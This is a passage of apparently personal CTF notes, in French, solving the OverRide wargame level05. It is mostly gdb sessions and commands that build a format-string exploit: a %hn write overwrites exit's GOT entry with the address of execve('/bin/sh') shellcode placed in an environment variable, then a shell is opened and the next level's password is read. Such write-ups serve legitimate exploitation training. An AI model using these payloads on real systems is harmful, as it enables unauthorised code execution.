@@ -1,0 +1,212 @@
+---> Alors ca sera un exploit de printf
+---> Possibilites:
+- Ret2libc (changer l'appel a exit() par un system("/bin/sh"))
+- Shellcode dans notre buffer (a convertir avant car tout byte <= 90, == ^ 32)
+- Shellcode dans l'environnement.
+
+
+---> In the GOT:
+level05@OverRide:~$ objdump -h ./level05
+...
+22 .got.plt      00000020  080497c8  080497c8  000007c8  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+...
+(gdb) x/40wx 0x080497c8
+0x80497c8 <_GLOBAL_OFFSET_TABLE_>:	0x080496fc	0xf7ffd918	0xf7ff0a40			0x08048346
+0x80497d8 <fgets@got.plt>:			0x08048356	0x08048366	0x08048376 <- here	0xf7e45420
+0x80497e8 <data_start>:				0x00000000	0x00000000	0xf7fcfac0	  		0x00000000
+0x80497f8 <dtor_idx.6161>:			0x00000000	0x00000000	0x00000000			0x00000000
+
+(gdb) x/1wx 0x08048376
+0x8048376 <exit@plt+6>:	0x00001868
+
+(gdb) p system
+$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+---> exit@plt se trouve en 0x080497e0 et <system> en 0xf7e6aed0
+
+level05@OverRide:~$ python -c 'print "|%p|"*200' | ./level05
+|0x64||0xf7fcfac0||0xf7ec3af9||0xffffd6ef||0xffffd6ee||(nil)||0xffffffff||0xffffd774||0xf7fdb000||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c||0x7c70257c
+
+----> Le debut de notre buffer dans printf se trouve a la 10eme position
+----> il reste toujours se probleme de conversion avant l'appel a printf...
+----> Mais quand je test:
+
+level05@OverRide:~$ bash | gdb ./level05
+(gdb) level05@OverRide:~$ echo disas main
+level05@OverRide:~$ Dump of assembler code for function main:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	push   %edi
+   0x08048448 <+4>:	push   %ebx
+   0x08048449 <+5>:	and    $0xfffffff0,%esp
+   0x0804844c <+8>:	sub    $0x90,%esp
+   0x08048452 <+14>:	   movl   $0x0,0x8c(%esp)
+   0x0804845d <+25>:	   mov    0x80497f0,%eax
+   0x08048462 <+30>:	   mov    %eax,0x8(%esp)
+   0x08048466 <+34>:	   movl   $0x64,0x4(%esp)
+   0x0804846e <+42>:	   lea    0x28(%esp),%eax
+   0x08048472 <+46>:	   mov    %eax,(%esp)
+   0x08048475 <+49>:	   call   0x8048350 <fgets@plt>
+   0x0804847a <+54>:	   movl   $0x0,0x8c(%esp)
+   0x08048485 <+65>:	   jmp    0x80484d3 <main+143>
+   0x08048487 <+67>:	   lea    0x28(%esp),%eax
+   0x0804848b <+71>:	   add    0x8c(%esp),%eax
+   0x08048492 <+78>:	   movzbl (%eax),%eax
+   0x08048495 <+81>:	   cmp    $0x40,%al
+   0x08048497 <+83>:	   jle    0x80484cb <main+135>
+   0x08048499 <+85>:	   lea    0x28(%esp),%eax
+   0x0804849d <+89>:	   add    0x8c(%esp),%eax
+   0x080484a4 <+96>:	   movzbl (%eax),%eax
+   0x080484a7 <+99>:	   cmp    $0x5a,%al
+   0x080484a9 <+101>:	   jg     0x80484cb <main+135>
+   0x080484ab <+103>:	   lea    0x28(%esp),%eax
+   0x080484af <+107>:	   add    0x8c(%esp),%eax
+   0x080484b6 <+114>:	   movzbl (%eax),%eax
+   0x080484b9 <+117>:	   mov    %eax,%edx
+   0x080484bb <+119>:	   xor    $0x20,%edx
+   0x080484be <+122>:	   lea    0x28(%esp),%eax
+   0x080484c2 <+126>:	   add    0x8c(%esp),%eax
+   0x080484c9 <+133>:	   mov    %dl,(%eax)
+   0x080484cb <+135>:	   addl   $0x1,0x8c(%esp)
+   0x080484d3 <+143>:	   mov    0x8c(%esp),%ebx
+   0x080484da <+150>:	   lea    0x28(%esp),%eax
+   0x080484de <+154>:	   movl   $0xffffffff,0x1c(%esp)
+   0x080484e6 <+162>:	   mov    %eax,%edx
+   0x080484e8 <+164>:	   mov    $0x0,%eax
+   0x080484ed <+169>:	   mov    0x1c(%esp),%ecx
+   0x080484f1 <+173>:	   mov    %edx,%edi
+   0x080484f3 <+175>:	   repnz scas %es:(%edi),%al
+   0x080484f5 <+177>:	   mov    %ecx,%eax
+   0x080484f7 <+179>:	   not    %eax
+   0x080484f9 <+181>:	   sub    $0x1,%eax
+   0x080484fc <+184>:	   cmp    %eax,%ebx
+   0x080484fe <+186>:	   jb     0x8048487 <main+67>
+   0x08048500 <+188>:	   lea    0x28(%esp),%eax
+   0x08048504 <+192>:	   mov    %eax,(%esp)
+   0x08048507 <+195>:	   call   0x8048340 <printf@plt>
+   0x0804850c <+200>:	   movl   $0x0,(%esp)
+   0x08048513 <+207>:	   call   0x8048370 <exit@plt>
+End of assembler dump.
+(gdb) echo b *0x0804850c
+level05@OverRide:~$ Breakpoint 1 at 0x804850c
+(gdb) echo r
+level05@OverRide:~$ Starting program: /home/users/level05/level05
+python -c 'print "\x08\x04\x97\xe0"[::-1]+"%10$n"'
+�
+
+Breakpoint 1, 0x0804850c in main ()
+(gdb) level05@OverRide:~$ echo 'x/4wx 0x080497e0'
+0x80497e0 <exit@got.plt>:	0x00000004	 0xf7e45420			 0x00000000	 0x00000000
+
+-----> j'ecris comme meme 0x00000004 malgre le fait que je passe 0x0804 au debut du buffer..
+-----> hmm ... weird
+-----> essayons d'ecrire l'appel a <system> du coup:
+
+level05@OverRide:~$ echo p 0xaed0
+$1 = 44752 (- 8 = 44744)
+(gdb) level05@OverRide:~$ echo p 0xf7e6 - 44752
+$2 = 18710
+
+(gdb) python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%44752d%10$hn"+"%18710d%11$hn"'
+(gdb) echo x/1wx 0x080497e0
+0x80497e0 <exit@got.plt>:	   0xf7eeaed8
+
+----> ah petit probleme de calcul
+----> J ai oublier d'enlever 8 au premier argument :/
+
+
+(gdb) python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%44744d%10$hn"+"%18710d%11$hn"'
+(gdb) echo x/1wx 0x080497e0
+0x80497e0 <exit@got.plt>:	   0xf7e6aed0
+
+(gdb) echo c
+level05@OverRide:~$ Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+
+---> hmm. surement normal vu que je passe aucun argument a <system>
+----> vas y on essaie de lancer un shellcode dans l'environnement ca sera moins complique.
+
+level05@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+level05@OverRide:~$ gdb ./level05
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
+(gdb) p *((char**)environ)
+No symbol table is loaded.  Use the "file" command.
+(gdb) p *((char**)environ)
+No symbol table is loaded.  Use the "file" command.
+(gdb) b main
+Breakpoint 1 at 0x8048449
+(gdb) r
+Starting program: /home/users/level05/level05
+
+Breakpoint 1, 0x08048449 in main ()
+(gdb) p *((char**)environ)
+$1 = 0xffffd869 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343P\211\342S\211\341\260\v̀"
+
+-----> du coup on revoit notre commande a envoyer. On prend l'adresse de SHELLCODE + 0x10 pour
+-----> ne pas tomber sur SHELLCODE=... mais dans les nop SLEDS.
+
+(gdb) p 0xd879 - 8
+$3 = 55409
+(gdb) p 0xffff - 55409
+$5 = 10126
+
+(gdb) python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%55409d%10$hn"+"%10126d%11$hn"'
+(gdb) python -c 'priecho x/1wx 0x080497e0
+0x80497e0 <exit@got.plt>:	  0x0007d869
+
+---> 8 de trop !
+
+(gdb) echo r
+python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%55409d%10$hn"+"%10118d%11$hn"'
+Breakpoint 1, 0x0804850c in main ()
+(gdb) echo x/1wx 0x080497e0
+level05@OverRide:~$ 0x80497e0 <exit@got.plt>:	0xffffd869
+----> Nikel !
+(gdb) echo c
+Continuing.
+level05@OverRide:~$ process 2043 is executing new program: /bin/dash
+warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
+Architecture of file not recognized.
+
+---> Parfait on lance bien un shell dans gdb.
+---> Sans gdb:
+
+level05@OverRide:~$ python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%55409d%10$hn"+"%10118d%11$hn"' | ./level05
+
+Segmentation fault (core dumped)
+
+----> ..... augmentons l'adresse, notre NOP SLEDS est assez grand:
+----> Pour rappel l'adresse du shellcode est 0xffffd879 donc si j'augmente cette adresse
+----> en 0xffffd899, j'augmente de 20 le premier %d et du coup je reduis le deuxieme %d de
+----> 20 egalement, pour retrouver 0xffff en debut d'adresse:
+
+level05@OverRide:~$ python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%55429d%10$hn"+"%10098d%11$hn"'| ./level05
+
+level05@OverRide:~$
+
+-----> PAS de SEGV !!! reste a rajouter un cat en fin de commande et le tour est jouer:
+
+level05@OverRide:~$ (python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%55429d%10$hn"+"%10098d%11$hn"' ; cat) | ./level05
+
+ls
+ls: cannot open directory .: Permission denied
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+
+
+
+
+---> BOUM !!!!
